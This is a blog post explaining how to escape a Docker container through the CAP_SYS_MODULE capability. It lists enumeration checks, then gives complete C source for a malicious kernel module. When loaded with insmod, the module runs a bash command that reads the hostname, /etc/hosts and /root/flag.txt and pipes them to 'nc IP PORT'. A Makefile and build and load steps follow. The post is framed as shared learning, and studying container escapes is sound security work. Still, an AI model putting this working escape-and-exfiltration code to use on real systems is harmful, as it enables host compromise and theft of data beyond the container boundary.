# Page 1

In this blog, I will go through some common techniques that can allow an attacker to escape a Docker container.

I learned these techniques while hunting on a target that allowed me to run Python scripts in an isolated environment. I tried to escape the container, but unfortunately, I was not able to do it because the target was very secure.

However, during my research, I learned several interesting techniques that I think can be useful to share. In this blog, I will document what I learned and explain the different Docker escape techniques I explored.



### **Escaping the Container with CAP\_SYS\_MODULE**

Before attempting this technique, we need to enumerate the container and verify that several requirements are met.

The following conditions are required:

* We must have **root privileges inside the container**.
*   The container must have the **`CAP_SYS_MODULE`** capability. Privileged containers usually have this capability. To check the current capabilities, run:

    ```bash
    cat /proc/self/status | grep -i cap
    ```

    Then decode the `CapEff` value:

    ```bash
    capsh --decode="CapEff output"
    ```

    We should see `cap_sys_module` in the output.
*   **Kernel module loading must be enabled.** We can check this with:

    ```bash
    cat /proc/sys/kernel/modules_disabled
    ```

    A value of `0` means that kernel module loading has not been disabled.
*   **Kernel module signature enforcement must not block unsigned modules.** We can check the `sig_enforce` parameter with:

    ```bash
    cat /sys/module/module/parameters/sig_enforce
    ```

    If the output is `N`, unsigned kernel modules are not being strictly enforced by this setting.

#### Example

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

**Exploit: Creating a Malicious Kernel Module**

Once all the required conditions are met, we can create a malicious kernel module and compile it using a `Makefile`.

The following kernel module executes a command when it is loaded:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tejas Jaiswal");
MODULE_DESCRIPTION("Kernel module to exfiltrate system data with clean output");

static int __init exfil_init(void) {
    printk(KERN_INFO "[+] Exfiltration Module Loaded\n");

    char *argv[] = {
        "/bin/bash",
        "-c",
        "(echo '[+] Hostname:'; hostname; echo ''; "
        "echo '[+] UID Info:'; head /etc/hosts; echo ''; "
        "echo '[+] /flag (first 5 lines):'; cat /root/flag.txt; echo '' ) | nc IP PORT",
        NULL
    };

    static char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit exfil_exit(void) {
    printk(KERN_INFO "[-] Exfiltration Module Unloaded\n");
}

module_init(exfil_init);
module_exit(exfil_exit);
```

#### Makefile

We also need a `Makefile` to compile the kernel module:

```makefile
obj-m += Malicious.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Run `make` to compile the module and generate the `.ko` file:

```bash
make
```

If the compilation is successful, we should have a file such as:

```
Malicious.ko
```

#### Loading the Kernel Module

We can then load the module using `insmod`:

```bash
insmod Malicious.ko
```

If everything is configured correctly, the module will be loaded and its initialization function will execute.

> **Note:** If you run into problems and need to remove the loaded module, you can use `rmmod` with the module name. To remove the generated build files, run `make clean`.

<figure><img src=".gitbook/assets/Screenshot 2026-09-22 160303 - Copy.png" alt=""><figcaption></figcaption></figure>
